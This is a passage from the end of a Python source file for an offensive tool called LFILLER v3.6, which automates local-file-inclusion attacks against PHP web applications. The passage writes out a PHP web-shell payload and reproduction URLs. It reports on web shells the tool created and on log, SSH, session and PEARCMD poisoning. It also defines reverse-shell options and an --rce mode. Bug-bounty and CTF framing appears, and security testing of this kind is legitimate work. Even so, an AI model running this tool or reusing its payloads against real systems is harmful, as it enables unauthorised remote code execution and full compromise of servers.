                    f.write("The application/OS has a filename length limit. By providing an extremely long path (truncation), the system ignores the trailing characters (e.g., the .php extension) and includes the intended file.\n")
                else:
                    f.write("The application fails to properly validate the input parameter, allowing an attacker to include arbitrary local files.\n")
                
                f.write("\nMANUAL REPRODUCTION STEPS:\n")
                f.write(f"1. Navigate to the following URL in your browser:\n   {res['url']}\n")
                f.write(f"2. Observe the content of the system file (e.g., /etc/passwd) rendered in the response.\n\n")
                f.write("EVIDENCE OF PROOF:\n")
                f.write(f"Command: curl -i \"{res['url']}\"\n")
                f.write("-" * 40 + "\n")

        # 1.1 Session Poisoning Reports
        for i, res in enumerate(self.results['session_files'], 1):
            report_count += 1
            filename = os.path.join(domain, f"bounty_SESSION_POISON_{i}.txt")
            with open(filename, "w") as f:
                f.write(f"VULNERABILITY: RCE via PHP Session Poisoning ($1000+ Value)\n")
                f.write("="*40 + "\n")
                f.write(f"Session Path: {res['path']}\n")
                f.write(f"LFI URL: {res['url']}\n\n")
                f.write("EXPLANATION:\n")
                f.write("PHP session files often store user-controlled data. If this data is poisoned with PHP code, including the session file via LFI results in Remote Code Execution.\n\n")
                f.write("REPRODUCTION:\n")
                f.write("1. Set a session variable (e.g., username) to '<?php system($_GET[\"cmd\"]); ?>'\n")
                f.write(f"2. Access: {res['url']}&cmd=id\n")

        # 1.2 File Descriptor Reports
        for i, res in enumerate(self.results['file_fds'], 1):
            report_count += 1
            filename = os.path.join(domain, f"bounty_FD_INCLUSION_{i}.txt")
            with open(filename, "w") as f:
                f.write(f"VULNERABILITY: LFI via File Descriptor (/proc/self/fd)\n")
                f.write("="*40 + "\n")
                f.write(f"Path: {res['path']}\n")
                f.write("EXPLANATION:\n")
                f.write("Linux file descriptors can hold references to open files, logs, or network streams. Brute-forcing these can bypass restricted directory access.\n")

        # 2. Wrapper Reports
        for i, (name, wrapper, url) in enumerate(self.results['php_wrappers'], 1):
            report_count += 1
            filename = os.path.join(domain, f"bounty_WRAPPER_{i}.txt")
            with open(filename, "w") as f:
                f.write(f"VULNERABILITY: PHP Wrapper Exploitation ({name})\n")
                f.write("="*40 + "\n")
                f.write(f"Target: {self.url}\n")
                f.write(f"Wrapper: {wrapper}\n\n")
                f.write("MANUAL REPRODUCTION STEPS:\n")
                f.write(f"1. Use the following payload to trigger the wrapper:\n   {url}\n")
                f.write("2. Observe sensitive data or code execution.\n")

        # 3. WebShell Reports
        for i, url in enumerate(self.results['webshell_urls'], 1):
            report_count += 1
            filename = os.path.join(domain, f"bounty_WEBSHELL_{i}.txt")
            story = self.results['exploitation_stories'][i-1] if i-1 < len(self.results['exploitation_stories']) else "Persistent Webshell Created."
            with open(filename, "w") as f:
                f.write(f"VULNERABILITY: Remote Code Execution (RCE) via WebShell\n")
                f.write("="*40 + "\n")
                f.write(f"Target Base: {self.url}\n")
                f.write(f"WebShell URL: {url}\n\n")
                f.write("EXPLANATION:\n")
                f.write("A critical vulnerability chain was identified allowing for the placement of a persistent web shell. This allows full administrative access to the underlying operating system.\n\n")
                f.write("EXPLOITATION CHAIN & MANUAL REPRODUCTION:\n")
                f.write(story + "\n\n")
                f.write("VERIFICATION STEPS:\n")
                f.write(f"1. Open the following URL to confirm execution:\n   {url}?cmd=id\n")
                f.write(f"2. Payload command executed to verify: 'id'\n")
                f.write(f"3. Expected output snippet: 'uid=... gid=...'\n\n")
                f.write("IMPACT:\n")
                f.write("Critical. Full system compromise. An attacker can execute arbitrary commands, access sensitive data, and pivot within the internal network.\n")

        # Save results to JSON for automation
        with open(os.path.join(domain, "findings.json"), "w") as f:
            json.dump(self.results, f, indent=4)

        print(f"[+] {Colors.GREEN}Report Generation Complete!{Colors.END} {report_count} reports saved to {domain}/")

    def _print_banner(self):
        banner = f"""{Colors.BLUE}
 ██╗     ███████╗██╗██╗     ██╗     ███████╗██████╗ 
 ██║     ██╔════╝██║██║     ██║     ██╔════╝██╔══██╗
 ██║     █████╗  ██║██║     ██║     █████╗  ██████╔╝
 ██║     ██╔══╝  ██║██║     ██║     ██╔══╝  ██╔══██╗
 ███████╗██║     ██║███████╗███████╗███████╗██║  ██║
 ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Colors.END}                 {Colors.BOLD}v3.6 - Ultimate Industrial LFILLER (Authenticated){Colors.END}
        """
        print(banner)

    def _display_summary(self):
        print("\n" + "="*70)
        print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
        print("="*70)
        if self.results['lfi_params']:
            print(f"\n{Colors.GREEN}[+] LFI VULNERABILITIES:{Colors.END}")
            for r in self.results['lfi_params'][:5]:
                print(f"  - Parameter: {Colors.CYAN}{r['param']}{Colors.END}")
                print(f"    URL: {r['url']}")
        
        if self.results['readable_files']:
            print(f"\n{Colors.GREEN}[+] READABLE FILES ({len(self.results['readable_files'])}):{Colors.END}")
            for fpath, content, url in self.results['readable_files']:
                 # Show filename and truncated content snippet
                 snippet = content.replace('\n', ' ').strip()[:50]
                 print(f"  - {Colors.CYAN}{fpath}{Colors.END}: {snippet}...")

        
        # New Advanced Results
        adv_results = []
        if self.results['filter_chain']: adv_results.append("PHP Filter Chain (No Logs RCE)")
        if self.results['data_wrapper']: adv_results.append("data:// Wrapper RCE")
        if self.results['input_wrapper']: adv_results.append("php://input Wrapper RCE")
        if self.results['proc_environ']: adv_results.append("/proc/self/environ Poisoning")
        if self.results['pearcmd']: adv_results.append("PEARCMD Exploitation")
        if self.results['ssh_poisoning']: adv_results.append("SSH Poisoning")
        
        if adv_results:
            print(f"\n{Colors.GREEN}[+] ADVANCED EXPLOITS FOUND:{Colors.END}")
            for result in adv_results:
                print(f"  - {Colors.YELLOW}{result}{Colors.END}")

        if self.results['log_poisoning']:
            print(f"\n{Colors.GREEN}[+] LOG POISONING RCE:{Colors.END}")
            for r in self.results['log_poisoning']:
                print(f"  - {r['log']} via {r['method']}")
                
        if self.results['webshell_urls']:
            print(f"\n{Colors.GREEN}[+] CREATED WEB SHELLS:{Colors.END}")
            for url in self.results['webshell_urls']:
                print(f"  - {Colors.CYAN}{url}{Colors.END}")
                print(f"    {Colors.YELLOW}Usage Example:{Colors.END} {url}?cmd=id")
        print("="*70)

def main():
    parser = argparse.ArgumentParser(
        description='LFILLER v3.6 - Industrial LFI Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
[... Quick Examples omitted for brevity but functionality preserved ...]
        """
    )
    parser = argparse.ArgumentParser(
        description='LFILLER v3.6 - Industrial LFI Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════╗
║                     QUICK EXAMPLES                       ║
╚══════════════════════════════════════════════════════════╝

BASIC AUDIT (Safe for Bounty):
  python3 lfiller.py -u "http://target.com/page.php?file=" -C "PHPSESSID=..."

FULL CHAIN RCE (Red Team / CTF ONLY):
  python3 lfiller.py -u "http://target.com/page.php?file=" --rce

╔══════════════════════════════════════════════════════════╗
║                 ⚠️  DANGER ZONE (--rce)  ⚠️              ║
╚══════════════════════════════════════════════════════════╝
The following modules are DISABLED by default and only run
when --rce is specified. These are aggressive/intrusive:

1. Log Poisoning (Auth.log, Access.log)
2. SSH Poisoning (Writes to auth logs via SSH port)
3. PEARCMD Exploitation (Writes to webroot)
4. RFI (Remote File Inclusion) and Reverse Shells
5. PHP Wrappers (expect://, php://input, data://)
6. Web Shell Creation (INTO OUTFILE / File Write)

USE WITH CAUTION.
        """
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-w', '--workers', type=int, default=20, help='Threads (default: 20)')
    parser.add_argument('-e', '--encode', choices=['none', 'url', 'double', 'unicode', 'all'], default='none')
    parser.add_argument('-p', '--param', help='Custom parameter')
    parser.add_argument('-lh', '--lhost', help='Local host for reverse shells')
    parser.add_argument('-lp', '--lport', type=int, default=4444, help='Local port for reverse shells')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-webshell', '--webshell', action='store_true', help='Web shell mode')
    
    # v3.6 - Auth Support
    parser.add_argument('-C', '--cookies', help='Session cookies (e.g. "PHPSESSID=xyz; auth=1")')
    parser.add_argument('-H', '--headers', help='Custom headers (e.g. "Authorization: Bearer X;; Custom: Val")')
    
    # Safety Check
    parser.add_argument('--rce', action='store_true', help='Enable intrusive RCE/Poisoning modules (Danger)')

    args = parser.parse_args()
    scanner = LFILLER(
        url=args.url, 
        workers=args.workers, 
        timeout=args.timeout,
        encode=args.encode, 
        custom_param=args.param, 
        webshell=args.webshell,
        lhost=args.lhost,
        lport=args.lport,
        cookies=args.cookies,
        headers=args.headers,
        rce=args.rce
    )
    try: scanner.run()
    except KeyboardInterrupt: print(f"\n{Colors.RED}[!] Interrupted.{Colors.END}")

if __name__ == "__main__":
    main()
